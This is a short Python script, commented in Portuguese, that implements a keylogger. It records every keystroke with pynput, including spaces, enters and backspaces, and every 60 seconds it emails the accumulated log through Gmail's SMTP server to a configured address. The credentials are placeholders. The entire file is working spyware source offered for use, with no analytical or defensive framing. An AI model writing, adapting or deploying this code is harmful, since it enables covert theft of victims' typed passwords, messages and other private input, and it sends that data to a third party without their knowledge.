from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# Email configuration
email_origem = 'origem_email.com'
email_destino = 'destino_email.com'
SENHA_EMAIL = 'sua_senha_email'


def enviar_email():
    """Envia email com o log capturado pelo keylogger.

    Se houver conteúdo no log, cria um email com o conteúdo do log
    e o envia para o email de destino configurado.

    Caso haja erro ao enviar o email, imprime a mensagem de erro.

    Limpa o log e inicia um timer para enviar outro email em 60 segundos.

    """
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Dados capturados pelo Keylogger'
        msg['From'] = email_origem
        msg['To'] = email_destino
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email_origem, SENHA_EMAIL)
            server.send_message(msg)
        except Exception as e:
            print(f'Erro ao enviar email: {e}')

        log = ""
    Timer(60, enviar_email).start()  # Envia email a cada 60 segundos

def on_press(key):
    """Callback para o keylogger.

    Recebe um objeto `key` que contém a tecla pressionada.

    Se a tecla for uma tecla alfanumérica, adiciona o caractere
    correspondente ao log.

    Se a tecla for uma tecla especial, trada o caractere
    correspondente ao log (p.ex. ' ' para a tecla de espaço).

    Ignora outras teclas especiais.

    """
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += ' '
        elif key == keyboard.Key.enter:
            log += '\n'
        elif key == keyboard.Key.backspace:
            log += '<'

        else:
            pass  # Ignora outras teclas especiais

# Inicia o listener do teclado

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  # Inicia o envio periódico de emails
    listener.join()